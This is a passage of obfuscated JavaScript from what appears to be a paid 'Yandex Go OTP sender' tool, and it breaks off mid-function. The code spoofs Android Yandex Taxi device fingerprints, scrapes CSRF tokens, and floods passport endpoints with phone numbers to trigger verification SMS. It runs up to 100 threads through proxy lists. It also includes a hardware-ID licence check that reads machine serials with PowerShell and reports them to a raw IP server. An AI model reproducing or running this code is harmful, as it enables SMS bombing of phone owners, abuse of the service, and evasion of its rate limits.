    v100 = crypto.randomBytes(3).readUIntBE(0, 3) % 100000000 + 700000000,
    v101 = crypto.randomBytes(16).toString("hex"),
    v102 = crypto.randomBytes(16).toString("hex"),
    v103 = "Mozilla/5.0 (Linux; Android " + v96.os + ';\x20' + v96.model + " Build/QKQ1.200114.002; wv) " + ("AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/" + v99 + '\x20') + ("Mobile Safari/537.36 PassportSDK/" + v98 + '.' + v100 + " ru.yandex.taxi/" + v97);
  const v104 = {};
  v104.dev = v96;
  return v104.appVer = v97, v104.sdkVer = v98, v104.chrome = v99, v104.deviceId = v101, v104.uuid = v102, v104.ua = v103, v104;
}
const HOST = "passport.my-manager-account.com",
  BASE = "https://" + HOST,
  DEBUG_FILE = path.join(__dirname, "debug_yandex.txt");
function dbg(v105, v106, v107) {}
async function sendOtp(v108, {
  proxy = null,
  timeout = 22000,
  onStatus = () => {}
} = {}) {
  const v109 = v108.startsWith('+') ? v108 : '+' + v108,
    v110 = v109.slice(1),
    {
      dev: v111,
      appVer: v112,
      deviceId: v113,
      uuid: v114,
      ua: v115
    } = makeDevice(),
    v116 = crypto.randomUUID();
  const v117 = {};
  v117.lang = 'en', v117.locale = 'US', v117.app_id = "ru.yandex.taxi", v117.app_platform = "android", v117.manufacturer = v111.manufacturer, v117.model = v111.model, v117.am_version_name = "7.51.12(751124928)", v117.app_version_name = v112, v117.device_id = v113, v117.am_version = "7.51.12", v117.app_signature = "production", v117.theme = "light", v117.source = "null", v117.device_name = v111.model;
  v117.uuid = v114, v117.connection_type = '9', v117.nosocial = "false", v117.auth_type = "yandex,lite,social,pdd,undefined", v117.reg_type = "neophonish", v117.noreturn = '1', v117.enable_2fa = "false", v117.mode = "phonish";
  const v118 = new URLSearchParams(v117).toString(),
    v119 = BASE + "/pwl/auth/add?" + v118,
    v120 = {};
  v120["User-Agent"] = v115, v120.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", v120["Accept-Encoding"] = "gzip, deflate, br", v120["Accept-Language"] = "en-US,en;q=0.9", v120["X-Requested-With"] = "ru.yandex.taxi", v120["sec-ch-ua"] = "\"Android WebView\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"", v120["sec-ch-ua-mobile"] = '?1', v120["sec-ch-ua-platform"] = "\"Android\"", v120.Connection = "keep-alive";
  const v121 = v120;
  let v122 = {},
    v123 = '',
    v124 = '';
  onStatus("INIT");
  try {
    const v133 = await request(v119, "GET", {
        ...v121,
        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        'Sec-Fetch-Site': "none",
        'Sec-Fetch-Mode': "navigate",
        'Sec-Fetch-Dest': "document",
        'Upgrade-Insecure-Requests': '1'
      }, null, proxy, timeout),
      v134 = path.join(__dirname, "html_dump.txt");
    try {
      fs.writeFileSync(v134, "STATUS: " + v133.status + "\nHEADERS: " + JSON.stringify(v133.headers) + '\x0a\x0a' + v133.data);
    } catch (v137) {}
    dbg("STEP0_INIT", v133.status, v133.data.substring(0, 500));
    if (v133.headers["set-cookie"]) v122 = mergeCookies(v122, parseCookies(v133.headers["set-cookie"]));
    const v135 = [/window\.__CSRF__\s*=\s*["']([a-f0-9]+:[0-9]+)["']/, /["']sk["']\s*:\s*["']([a-f0-9]+:[0-9]+)["']/, /["']csrf["']\s*:\s*["']([a-f0-9]+:[0-9]+)["']/, /["']csrfToken["']\s*:\s*["']([a-f0-9]+:[0-9]+)["']/, /window\.__data[^{]*{[^}]*["']sk["']\s*:\s*["']([a-f0-9]+:[0-9]+)["']/, /name=["'](?:csrf[_-]?token|sk)["'][^>]*content=["']([a-f0-9]+:[0-9]+)["']/, /content=["']([a-f0-9]+:[0-9]+)["'][^>]*name=["'](?:csrf[_-]?token|sk)["']/, /data-(?:csrf|sk)=["']([a-f0-9]+:[0-9]+)["']/, /["']([a-f0-9]{40}:[0-9]{10})["']/];
    for (const v138 of v135) {
      const v139 = v133.data.match(v138);
      if (v139) {
        {
          v123 = v139[1];
          break;
        }
      }
    }
    const v136 = [/track_id=([a-f0-9]{20,})/, /["']track_id["']\s*:\s*["']([a-f0-9]{20,})["']/, /["']trackId["']\s*:\s*["']([a-f0-9]{20,})["']/];
    for (const v140 of v136) {
      {
        const v141 = v133.data.match(v140);
        if (v141) {
          {
            v124 = v141[1];
            break;
          }
        }
      }
    }
    if (!v123) try {
      const v142 = await request(BASE + "/pwl/api/csrf-token", "GET", {
        ...v121,
        'Accept': "application/json, text/plain, */*",
        'Sec-Fetch-Site': "same-origin",
        'Sec-Fetch-Mode': "cors",
        'Sec-Fetch-Dest': "empty",
        'Referer': BASE + '/',
        'Cookie': cookieStr(v122)
      }, null, proxy, timeout);
      if (v142.headers["set-cookie"]) v122 = mergeCookies(v122, parseCookies(v142.headers["set-cookie"]));
      const v143 = v142.headers["x-csrf-token"];
      if (v143) v123 = v143;else {
        try {
          const v144 = JSON.parse(v142.data);
          v123 = v144.csrf || v144.csrfToken || v144.token || '', v124 = v124 || v144.track_id || '';
        } catch (v145) {}
      }
    } catch (v146) {}
  } catch (v147) {
    return {
      'success': false,
      'error': "INIT_FAIL: " + v147.message
    };
  }
  if (!v123) {
    const v148 = Math.floor(Date.now() / 1000);
    v123 = crypto.createHash("sha1").update(crypto.randomBytes(32)).digest("hex") + ':' + v148;
  }
  onStatus("TRACK");
  const v125 = formatPhoneForYandex(v109);
  try {
    {
      const v149 = {};
      v149.display_language = 'en', v149.language = 'en', v149.country = v125.country, v149.app_id = "ru.yandex.taxi", v149.app_version_name = v112, v149.device_id = v113, v149.device_connection_type = "WIFI";
      const v150 = JSON.stringify(v149),
        v151 = {
          'Host': HOST,
          'Connection': "keep-alive",
          'x-csrf-token': v123,
          'c11n': "yandex_go",
          'sec-ch-ua-platform': "\"Android\"",
          'sec-ch-ua': "\"Android WebView\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"",
          'sec-ch-ua-mobile': '?1',
          'User-Agent': v115,
          'process-uuid': v116,
          'content-type': "application/json",
          'Accept': "*/*",
          'Origin': BASE,
          'X-Requested-With': "ru.yandex.taxi",
          'Sec-Fetch-Site': "same-origin",
          'Sec-Fetch-Mode': "cors",
          'Sec-Fetch-Dest': "empty",
          'Referer': BASE + "/pwl/auth/add?" + v118,
          'Accept-Encoding': "gzip, deflate, br",
          'Accept-Language': "en-US,en;q=0.9",
          'Cookie': cookieStr(v122)
        },
        v152 = await request(BASE + "/pwl/api/passport/track/create", "POST", v151, v150, proxy, timeout);
      dbg("STEP0B_TRACK_CREATE", v152.status, v152.data);
      if (v152.headers["set-cookie"]) v122 = mergeCookies(v122, parseCookies(v152.headers["set-cookie"]));
      try {
        {
          const v153 = JSON.parse(v152.data);
          v153.id && (v124 = v153.id, dbg("TRACK_ID_GOT", v152.status, "track_id=" + v124));
        }
      } catch (v154) {}
      if (!v124) {
        return dbg("TRACK_CREATE_FAIL", v152.status, v152.data), {
          'success': false,
          'error': "TRACK_CREATE_FAIL (" + v152.status + "): " + v152.data.substring(0, 200)
        };
      }
    }
  } catch (v155) {
    return {
      'success': false,
      'error': "TRACK_NET_FAIL: " + v155.message
    };
  }
  try {
    {
      const v156 = {};
      v156.track_id = v124, v156.check_for_push = true, v156.push_suggest_log_all_subscriptions = false, v156.phone_number = v125.phone_number;
      const v157 = JSON.stringify(v156),
        v158 = {
          'Host': HOST,
          'Connection': "keep-alive",
          'x-csrf-token': v123,
          'c11n': "yandex_go",
          'sec-ch-ua': "\"Android WebView\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"",
          'sec-ch-ua-mobile': '?1',
          'User-Agent': v115,
          'process-uuid': v116,
          'content-type': "application/json",
          'Accept': "*/*",
          'Origin': BASE,
          'X-Requested-With': "ru.yandex.taxi",
          'Sec-Fetch-Site': "same-origin",
          'Sec-Fetch-Mode': "cors",
          'Sec-Fetch-Dest': "empty",
          'Referer': BASE + "/pwl/auth/add?" + v118,
          'Accept-Encoding': "gzip, deflate, br",
          'Accept-Language': "en-US,en;q=0.9",
          'Cookie': cookieStr(v122)
        },
        v159 = await request(BASE + "/pwl/api/passport/suggest/check_availability", "POST", v158, v157, proxy, timeout);
      dbg("STEP0C_SUGGEST", v159.status, v159.data);
      if (v159.headers["set-cookie"]) v122 = mergeCookies(v122, parseCookies(v159.headers["set-cookie"]));
    }
  } catch (v160) {}
  onStatus("SENDING");
  const v126 = {};
  v126.track_id = v124, v126.validate_for_call = true, v126.force_check_for_protocols = true, v126.phone_number = v125.phone_number, v126.country = v125.country, v126.statInfo = {}, v126.statInfo.mask = v125.mask, v126.statInfo.startDialCode = v125.dialCode, v126.statInfo.startMask = v125.startMask;
  const v127 = JSON.stringify(v126),
    v128 = {
      'Host': HOST,
      'Connection': "keep-alive",
      'sec-ch-ua-platform': "\"Android\"",
      'x-csrf-token': v123,
      'c11n': "yandex_go",
      'tractor-location': '',
      'sec-ch-ua': "\"Android WebView\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"",
      'sec-ch-ua-mobile': '?1',
      'User-Agent': v115,
      'process-uuid': v116,
      'content-type': "application/json",
      'Accept': "*/*",
      'Origin': BASE,
      'X-Requested-With': "ru.yandex.taxi",
      'Sec-Fetch-Site': "same-origin",
      'Sec-Fetch-Mode': "cors",
      'Sec-Fetch-Dest': "empty",
      'Referer': BASE + '/',
      'Accept-Encoding': "gzip, deflate, br",
      'Accept-Language': "en-US,en;q=0.9",
      'Cookie': cookieStr(v122)
    };
  let v129;
  try {
    v129 = await request(BASE + "/pwl/api/passport/validate/phone_number", "POST", v128, v127, proxy, timeout), dbg("STEP1_OTP", v129.status, v129.data);
  } catch (v161) {
    return {
      'success': false,
      'error': "NET_FAIL: " + v161.message
    };
  }
  let v130 = {};
  try {
    v130 = JSON.parse(v129.data);
  } catch (v162) {}
  const v131 = v129.data.toLowerCase();
  if (v129.status === 200) {
    if (v130.status === 'ok' || v130.code_sent || v130.valid_for_sms || v131.includes("\"ok\"") || v131.includes("code_sent") || v131.includes("\"sms\"") || v131.includes("track_id") && !v131.includes("error")) {
      {
        const v163 = v130.track_id || v124,
          v164 = {};
        v164.number = v109, v164.track_id = v163, v164.display_language = 'en', v164.gps_package_name = "ru.yandex.taxi", v164.force_check_for_protocols = true, v164.country = v125.country, v164.code_format = '', v164.transport = '';
        const v165 = JSON.stringify(v164),
          v166 = {
            ...v128,
            'Cookie': cookieStr(v122),
            'Referer': BASE + '/'
          };
        try {
          const v167 = await request(BASE + "/pwl/api/passport/confirm_phone/submit", "POST", v166, v165, proxy, timeout);
          dbg("STEP1B_SUBMIT", v167.status, v167.data);
          if (v167.status === 200 || v167.status === 201) {
            {
              const v169 = {};
              return v169.success = true, v169.phone = v109, v169.track_id = v163, v169;
            }
          }
          const v168 = {};
          return v168.success = true, v168.phone = v109, v168.track_id = v163, v168.note = "submit_" + v167.status, v168;
        } catch (v170) {
          dbg("STEP1B_SUBMIT", "ERR", v170.message);
          const v171 = {};
          return v171.success = true, v171.phone = v109, v171.track_id = v163, v171.note = "submit_net_err", v171;
        }
      }
    }
    if (v131.includes("too many") || v131.includes("ratelimit") || v131.includes("limit")) return {
      'success': false,
      'error': "RATE_LIMIT",
      'raw': v129.data.substring(0, 200)
    };
    if (v130.errors || v131.includes("invalid") || v131.includes("not valid")) return {
      'success': false,
      'error': "INVALID_PHONE",
      'raw': v129.data.substring(0, 200)
    };
  }
  if (v129.status === 403) return {
    'success': false,
    'error': "CSRF_FAILED (403)"
  };
  if (v129.status === 429) return {
    'success': false,
    'error': "RATE_LIMIT (429)"
  };
  const v132 = {};
  v132.success = false, v132.error = "INVALID_PHONE (422): " + (v130.message || '');
  if (v129.status === 422) return v132;
  if (v129.status === 401) return {
    'success': false,
    'error': "UNAUTHORIZED (401)"
  };
  return {
    'success': false,
    'error': "HTTP_" + v129.status,
    'raw': v129.data.substring(0, 200)
  };
}
if (isMainThread) {
  const B = chalk.hex("#FFDD00"),
    C = chalk.hex("#00BFFF"),
    W = chalk.white,
    G = chalk.gray,
    Y = chalk.hex("#FFD700");
  function printHeader(v172 = '') {
    {
      process.stdout.write("[2J[3J[H");
      console.log(B("  ██╗   ██╗ █████╗ ███╗   ██╗██████╗ ███████╗██╗  ██╗"));
      console.log(B("  ╚██╗ ██╔╝██╔══██╗████╗  ██║██╔══██╗██╔════╝╚██╗██╔╝"));
      console.log(B("   ╚████╔╝ ███████║██╔██╗ ██║██║  ██║█████╗   ╚███╔╝ "));
      console.log(B("    ╚██╔╝  ██╔══██║██║╚██╗██║██║  ██║██╔══╝   ██╔██╗ "));
      console.log(B("     ██║   ██║  ██║██║ ╚████║██████╔╝███████╗██╔╝ ██╗"));
      console.log(B("     ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝\n"));
      console.log(W("  ┌──────────────────────────────────────────────┐"));
      console.log(W("  │ [•] OWNER      : ") + B("NOT REXY                       ") + W('│'));
      console.log(W("  │ [•] Telegram  : ") + C("t.me/Rex_OTP_Tool            ") + W('│'));
      console.log(W("  │ [•] Status    : ") + G("Premium License              ") + W('│'));
      console.log(W("  │ [•] Version   : ") + Y("V1.0.0                       ") + W('│'));
      console.log(W("  └──────────────────────────────────────────────┘\n"));
      v172 && console.log(W.bold("  --- " + v172 + " ---\n"));
    }
  }
  class Dashboard {
    constructor(v173) {
      {
        this.totalNumbers = v173;
        this.processed = 0;
        this.successful = 0;
        this.failed = 0;
        this.startTime = Date.now();
      }
    }
    ["addLog"](v174, v175, v176 = '') {
      const v177 = chalk.hex("#00FF88"),
        v178 = chalk.hex("#00BFFF"),
        v179 = chalk.hex("#FFD700");
      const v180 = chalk.gray;
      const v181 = chalk.hex("#FF6B6B"),
        v182 = {};
      v182.hour12 = false;
      const v183 = new Date().toLocaleTimeString("en-US", v182);
      let v184 = '';
      if (v175 === "success") v184 = v177("[YANDEX] [SUCCESS]");else {
        if (v175 === "retry") v184 = v179("[RETRY  ]");else v184 = v181("[ERROR  ]");
      }
      const v185 = v180('[' + v183 + ']') + '\x20' + v184 + '\x20' + v174 + (v176 ? '\x20' + v180(v176) : '');
      process.stdout.write("\r[K" + v185 + '\x0a'), this.render();
    }
    ["setStatus"](v186) {}
    ["update"]() {}
    ["render"]() {
      const v187 = chalk.hex("#00FF88"),
        v188 = chalk.white,
        v189 = chalk.hex("#FF6B6B"),
        v190 = (this.processed / Math.max(this.totalNumbers, 1) * 100).toFixed(1);
      const v191 = '\x20\x20' + v188.bold("YANDEX GO") + " ⮞ [" + this.processed + '/' + this.totalNumbers + ']\x20' + v190 + "% │ " + v187("Sent: " + this.successful) + " │ " + v189("Err: " + this.failed);
      process.stdout.write("\r[K" + v191);
    }
    ["stop"]() {
      const v192 = chalk.hex("#00BFFF"),
        v193 = chalk.white;
      process.stdout.write("[2K\r\n");
      const v194 = Math.floor((Date.now() - this.startTime) / 1000),
        v195 = Math.floor(v194 / 60),
        v196 = v194 % 60,
        v197 = v195 + 'm\x20' + v196 + 's';
      console.log(v192("  ╔════════════════════════════════════════════╗")), console.log(v192("  ║") + v193.bold("  YANDEX GO OTP TRIGGER — COMPLETE          ") + v192('║')), console.log(v192("  ╠════════════════════════════════════════════╣"));
      console.log(v192("  ║") + ('\x20\x20' + chalk.greenBright("Successful") + "   " + chalk.greenBright(String(this.successful).padStart(6)) + "                       ") + v192('║')), console.log(v192("  ║") + ('\x20\x20' + chalk.red("Failed") + "       " + chalk.red(String(this.failed).padStart(6)) + "                       ") + v192('║')), console.log(v192("  ║") + ('\x20\x20' + chalk.cyan("Total Time") + "   " + chalk.cyan(v197.padEnd(6)) + "                       ") + v192('║')), console.log(v192("  ╚════════════════════════════════════════════╝\n"));
    }
  }
  async function selectOption(v198, v199) {
    return new Promise(v200 => {
      let v201 = 0;
      process.stdin.resume(), readline.emitKeypressEvents(process.stdin);
      if (process.stdin.isTTY) process.stdin.setRawMode(true);
      const fn4 = () => {
        printHeader(), console.log("   [33m" + v198 + "[0m\n");
        v199.forEach((v202, v203) => {
          v203 === v201 ? console.log("   [36m➔[32m " + v202.name + "[0m") : console.log("     [90m" + v202.name + "[0m");
        });
      };
      fn4();
      const fn5 = (v204, v205) => {
        {
          if (v205.ctrl && v205.name === 'c') process.exit(0);
          if (v205.name === 'up') v201 = (v201 - 1 + v199.length) % v199.length, fn4();else {
            if (v205.name === "down") {
              v201 = (v201 + 1) % v199.length, fn4();
            } else v205.name === "return" && (process.stdin.setRawMode(false), process.stdin.removeListener("keypress", fn5), v200(v199[v201].value));
          }
        }
      };
      process.stdin.on("keypress", fn5);
    });
  }
  async function promptText(v206, v207) {
    return new Promise(v208 => {
      process.stdout.write("   [33m" + v206 + "[0m ");
      let v209 = '';
      if (process.stdin.isTTY) process.stdin.setRawMode(false);
      process.stdin.resume();
      const fn6 = v210 => {
        {
          const v211 = v210.toString();
          if (v211.includes('\x0a') || v211.includes('\x0d')) {
            {
              process.stdin.removeListener("data", fn6), v209 += v211.split(/[\r\n]/)[0];
              let v212 = v209.trim();
              if (v212.startsWith('\x22') && v212.endsWith('\x22')) {
                v212 = v212.slice(1, -1);
              } else {
                if (v212.startsWith('\x27') && v212.endsWith('\x27')) {
                  v212 = v212.slice(1, -1);
                }
              }
              v208(v212 || v207);
            }
          } else v209 += v211;
        }
      };
      process.stdin.on("data", fn6);
    });
  }
  async function interactiveWizard() {
    printHeader("YANDEX GO OTP SENDER");
    const v213 = await selectOption("SELECT NUMBER SOURCE", [{
      'name': "📁 Load from file (numbers.txt)",
      'value': "file"
    }, {
      'name': "🌐 Auto fetch from NexaOTP Panel",
      'value': "nexa"
    }]);
    let v214 = "numbers.txt";
    let v215 = null;
    if (v213 === "nexa") {
      const v218 = chalk.gray,
        v219 = chalk.hex("#FF6B6B");
      let v220 = '';
      if (fs.existsSync(NEXA_KEY_FILE)) {
        {
          v220 = fs.readFileSync(NEXA_KEY_FILE, "utf8").trim();
          const v227 = await selectOption("Saved NexaOTP Key found (" + v220.substring(0, 10) + "...)", [{
            'name': "Use saved key",
            'value': "use"
          }, {
            'name': "Enter new key",
            'value': "new"
          }, {
            'name': "Remove saved key",
            'value': "remove"
          }]);
          if (v227 === "remove") {
            fs.unlinkSync(NEXA_KEY_FILE), v220 = '', console.log(v218("\n   ✓ Saved API key removed.\n"));
          } else v227 === "new" && (v220 = '');
        }
      }
      if (!v220) {
        v220 = await promptText("Enter NexaOTP API Key:", '');
        const v228 = {};
        v228.name = 'No', v228.value = 'no';
        const v229 = await selectOption("Save this key for future use?", [{
          'name': "Yes, save it",
          'value': "yes"
        }, v228]);
        v229 === "yes" && (fs.writeFileSync(NEXA_KEY_FILE, v220, "utf8"), console.log(v218("\n   ✓ API key saved.\n")));
      }
      let v221 = [],
        v222 = true;
      while (v222) {
        {
          const v230 = await promptText("Enter range #" + (v221.length + 1) + " (e.g. 880131168XXX):", '');
          if (v230) v221.push(v230);
          const v231 = await selectOption("Add another range?", [{
            'name': "Yes",
            'value': "yes"
          }, {
            'name': "No, proceed",
            'value': 'no'
          }]);
          if (v231 === 'no') v222 = false;
        }
      }
      v221.length === 0 && (console.log(v219("\n   ✗ You must provide at least one range.\n")), process.exit(1));
      const v223 = await promptText("How many numbers to process? (e.g. 100):", '50'),
        v224 = parseInt(v223) || 50,
        v225 = await selectOption("SELECT NEXA SERVER", [{
          'name': "Server 1 (/get)",
          'value': "/api/v1/numbers/get"
        }, {
          'name': "Server 2 (/p2/get)",
          'value': "/api/v1/numbers/p2/get"
        }, {
          'name': "Server 3 (/p3/get)",
          'value': "/api/v1/numbers/p3/get"
        }]),
        v226 = {};
      v226.apiKey = v220, v226.ranges = v221, v226.totalCount = v224, v226.serverEndpoint = v225, v215 = v226;
    } else {
      {
        v214 = await promptText("Enter Numbers/Emails File Path [default: numbers.txt]:", "numbers.txt");
        if (!fs.existsSync(v214)) fs.writeFileSync(v214, '');
      }
    }
    let v216 = await promptText("Enter Proxies File Path (Leave blank for direct) [default: none]:", "none");
    if (v216 === "none" || v216 === '') v216 = '';
    let v217 = await selectOption("SELECT THREADS", [{
      'name': "10 Threads",
      'value': 0xa
    }, {
      'name': "20 Threads (Default)",
      'value': 0x14
    }, {
      'name': "50 Threads (Fast)",
      'value': 0x32
    }, {
      'name': "100 Threads (Extreme)",
      'value': 0x64
    }, {
      'name': "Custom",
      'value': "custom"
    }]);
    if (v217 === "custom") {
      const v232 = await promptText("Enter custom number of threads:", '20');
      v217 = parseInt(v232) || 20;
    }
    return process.stdin.pause(), {
      'numbersFile': v214,
      'threads': String(v217),
      'proxiesFile': v216,
      'nexaConfig': v215
    };
  }
  function generateHWID() {
    const v233 = require('os');
    const v234 = v233.platform();
    try {
      if (v234 === "win32") {
        {
          const v235 = execSync('powershell -NoProfile -Command "$mg = (Get-ItemProperty \'HKLM:\\SOFTWARE\\Microsoft\\Cryptography\' -ErrorAction SilentlyContinue).MachineGuid; $cpu = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1).ProcessorId; $disk = (Get-CimInstance Win32_LogicalDisk -Filter \'DeviceID=\\\'C:\\\'\' -ErrorAction SilentlyContinue).VolumeSerialNumber; $mb = (Get-CimInstance Win32_BaseBoard -ErrorAction SilentlyContinue).SerialNumber; Write-Output (($mg,$cpu,$disk,$mb) -join \'|\')"', {
            'stdio': "pipe",
            'timeout': 0x3a98
          }).toString().trim();
          if (!v235) throw new Error("No hardware data");
          const v236 = crypto.createHash("sha256").update(v235).digest("hex").toUpperCase();
          return "SKING-" + v236.substring(0, 8) + '-' + v236.substring(8, 12) + '-' + v236.substring(12, 16);
        }
      } else {
        {
          let v237 = [];
          try {
            {
              const v240 = v233.cpus();
              v237.push(v240 && v240.length > 0 ? v240[0].model : "UnknownCPU"), v237.push(v233.totalmem()), v237.push(v233.release());
            }
          } catch (v241) {}
          const v238 = v237.join('||'),
            v239 = crypto.createHash("sha256").update(v238).digest("hex").toUpperCase();
          return "ANKING-" + v239.substring(0, 8) + '-' + v239.substring(8, 12) + '-' + v239.substring(12, 16);
        }
      }
    } catch (v242) {
      return '';
    }
  }
  function verifyServerSignature(v243, v244) {
    if (!v244) return false;
    const v245 = "-----BEGIN PUBLIC KEY-----\nMCowBQYDK2VwAyEAIU7Pc75ao+Fn7XGC7kFGeDh7JAs3o4NSL2LgmN0YmfY=\n-----END PUBLIC KEY-----";
    try {
      return crypto.verify(null, Buffer.from(v243, "utf8"), v245, Buffer.from(v244, "base64"));
    } catch (v246) {
      return false;
    }
  }
  async function start() {
    const v247 = process.argv.slice(2).filter(v279 => !v279.startsWith('--')),
      v248 = chalk.hex("#FFDD00"),
      v249 = chalk.hex("#00BFFF"),
      v250 = chalk.hex("#FFD700"),
      v251 = chalk.gray,
      v252 = chalk.hex("#FF6B6B");
    let v253 = generateHWID();
    !v253 && (console.error(v252("\n  ✗ Could not generate Hardware ID. Run on Windows.\n")), process.exit(1));
    let v254 = false,
      v255 = "Premium User";
    const v256 = Date.now();
    try {
      const v280 = "188.137.176.163",
        v281 = require("http"),
        v282 = await new Promise((v283, v284) => {
          {
            const v285 = {};
            v285.hwid = v253, v285.app_id = "yandex", v285.version = "1.0.0", v285.timestamp = v256;
            const v286 = JSON.stringify(v285),
              v287 = {
                'hostname': v280,
                'port': 0xec1,
                'path': "/api/verify",
                'method': "POST",
                'headers': {
                  'Content-Type': "application/json",
                  'Content-Length': Buffer.byteLength(v286)
                },
                'timeout': 0x2710
              },
              v288 = v281.request(v287, v289 => {
                let v290 = '';
                v289.on("data", v291 => v290 += v291);
                v289.on("end", () => {
                  try {
                    v283(JSON.parse(v290));
                  } catch (v292) {
                    v284(v292);
                  }
                });
              });
            v288.on("error", v284), v288.on("timeout", function () {
              this.destroy(), v284(new Error("Timeout"));
            }), v288.write(v286), v288.end();
          }
        });
      if (v282) {
        v282.status === "update_required" && (console.error(v252("\n  ✗ Update required! Please download the latest version.\n")), process.exit(1));
        if (v282.status === "banned" || v282.status === "expired" || !v282.sig) {
          await new Promise(v297 => setTimeout(v297, 2000));
          let v296 = String(v282.reason || "NOT REGISTERED");
          if (!v282.reason && !v282.sig) v296 = "NOT REGISTERED / REMOVED";
          console.error(v252("\n  ╔══════════════════════════════════════════════╗")), console.error(v252("  ║    ✗ UNAUTHORIZED HARDWARE — YANDEX TOOL    ║")), console.error(v252("  ╠══════════════════════════════════════════════╣")), console.error(v252("  ║  HWID   : ") + v250(v253.padEnd(33)) + v252('║')), console.error(v252("  ║  Status : " + v296.padEnd(26) + '║')), console.error(v252("  ║  Contact: t.me/Rex_OTP_Tool to register     ║")), console.error(v252("  ╚══════════════════════════════════════════════╝\n")), process.exit(1);
        }
        const v293 = v253 + "|yandex|1.0.0|" + v256;
        !verifyServerSignature(v293, v282.sig) && (console.error(v252("\n  ✗ Internal Server Error (500). Please try again later.\n")), process.exit(1));
        v254 = true;
        if (v282.user) v255 = v282.user;
        let v294 = v282.token;
        !v294 && (console.error(v252("\n  ✗ Invalid Server Response: Missing Active Session Token. Aborting.\n")), process.exit(1));
        const v295 = setInterval(() => {
          {
            !v294 && (console.error(v252("\n  ✗ Session Token lost. Aborting...\n")), process.exit(1));
            const v298 = {};
            v298.hwid = v253, v298.app_id = "yandex", v298.token = v294;
            const v299 = JSON.stringify(v298),
              v300 = {
                'hostname': v280,
                'port': 0xec1,
                'path': "/api/ping",
                'method': "POST",
                'headers': {
                  'Content-Type': "application/json",
                  'Content-Length': Buffer.byteLength(v299)
                },
                'timeout': 0x3a98
              },
              v301 = v281.request(v300, v302 => {
                let v303 = '';
                v302.on("data", v304 => v303 += v304);
                v302.on("end", () => {
                  try {
                    const v305 = JSON.parse(v303);
                    v305.status === 'ok' && v305.token ? v294 = v305.token : (console.error(v252("\n  ✗ Session invalidated by server (kill). Exiting...\n")), process.exit(1));
                  } catch (v306) {
                    console.error(v252("\n  ✗ Network error during session ping. Exiting...\n")), process.exit(1);
                  }
                });
              });
            v301.on("error", () => {
              console.error(v252("\n  ✗ Disconnected from License Server. Exiting...\n")), process.exit(1);
            }), v301.on("timeout", function () {
              this.destroy();
              console.error(v252("\n  ✗ License Server timeout. Exiting...\n")), process.exit(1);
            }), v301.write(v299), v301.end();
          }
        }, 45000);
        if (v295 && v295.unref) v295.unref();
      }
    } catch (v307) {
      console.error(v252("\n  ✗ License server is currently undergoing maintenance or is unreachable.")), console.error(v252("    Error: " + v307.message)), console.error(v252("    Please check your internet connection or try again later.\n")), process.exit(1);
    }
    !v254 && (console.error(v252("\n  ✗ License verification failed. Exiting.\n")), process.exit(1));
    let v257 = await interactiveWizard(),
      v258 = path.resolve(v257.numbersFile || "numbers.txt"),
      v259 = parseInt(v257.threads) || 20,
      v260 = v257.proxiesFile || '',
      v261 = v257.nexaConfig || null;
    printHeader(), console.log(chalk.green("  ✓ License: " + v255) + chalk.gray(" | HWID: " + v253));
    let v262 = [],
      v263 = [],
      v264 = false,
      v265 = 0,
      v266 = 0,
      v267 = [];
    v261 ? (console.log(v250("\n  [NexaOTP] Streaming " + v261.totalCount + " numbers from panel (" + v261.ranges.length + " range(s))...")), (async () => {
      for (let v308 = 0; v308 < v261.totalCount; v308++) {
        try {
          {
            const v309 = v261.ranges[Math.floor(Math.random() * v261.ranges.length)],
              v310 = await nexaLimiter.enqueue(() => nexaFetchNumber(v261.apiKey, v309, v261.serverEndpoint));
            if (v310) {
              v265++;
              if (v267.length > 0) {
                {
                  const v311 = v267.shift();
                  v311(v310);
                }
              } else v263.push(v310);
            }
          }
        } catch (v312) {
          v266++;
        }
      }
      v264 = true;
      for (const v313 of v267) v313(null);
      v267 = [];
    })()) : (!fs.existsSync(v258) && (console.error(v252("✗ Error: Numbers file not found: " + v258)), process.exit(1)), v262 = fs.readFileSync(v258, "utf8").split(/\r?\n/).map(v314 => v314.trim()).filter(v315 => v315 && v315.replace(/\D/g, '').length >= 7), v262.length === 0 && (console.error(v252("✗ No valid phone numbers found in file")), process.exit(1)));
    let v268 = [];
    v260 && fs.existsSync(v260) && (v268 = fs.readFileSync(v260, "utf8").split('\x0a').map(v316 => v316.trim()).filter(v317 => v317.length > 0));
    let v269 = v268.map(v318 => {
      let v319 = v318.trim();
      if (!v319) return null;
      let v320 = "http";
      if (v319.startsWith("socks5://")) v320 = "socks5", v319 = v319.slice(9);else {
        if (v319.startsWith("socks4://")) v320 = "socks4", v319 = v319.slice(9);else {
          if (v319.startsWith("http://")) v320 = "http", v319 = v319.slice(7);else v319.startsWith("https://") && (v320 = "http", v319 = v319.slice(8));
        }
      }
      const v321 = {};
      return v321.type = v320, v321.original = v319, v321;
    }).filter(Boolean);
    if (v261) console.log(v250("  ✓ Mode: NexaOTP Streaming (" + v261.totalCount + " numbers)"));else {
      console.log(v250("✓ Loaded " + v262.length + " targets"));
    }
    if (v269.length === 0) console.log(v251("  No proxies configured (running direct)"));else console.log(v251("  Proxies loaded: " + v269.length));
    console.log(v249("✓ Threads: " + v259 + '\x0a'));
    const v270 = "successful.txt",
      v271 = "failed.txt",
      v272 = v261 ? v261.totalCount : v262.length,
      v273 = new Dashboard(v272),
      v274 = v261 ? async () => {
        if (v263.length > 0) return v263.shift();
        if (v264) return null;
        return new Promise(v322 => {
          v267.push(v322);
        });
      } : async () => {
        {
          if (v262.length === 0) return null;
          const v323 = Math.floor(Math.random() * v262.length);
          return v262.splice(v323, 1)[0];
        }
      };
    let v275 = 0;
    const fn7 = () => {
      {
        if (v269.length === 0) return null;
        const v324 = v269[v275 % v269.length];
        return v275++, v324.original;
      }
    };
    function fn8(v325) {
      try {
        {
          if (v261) return;
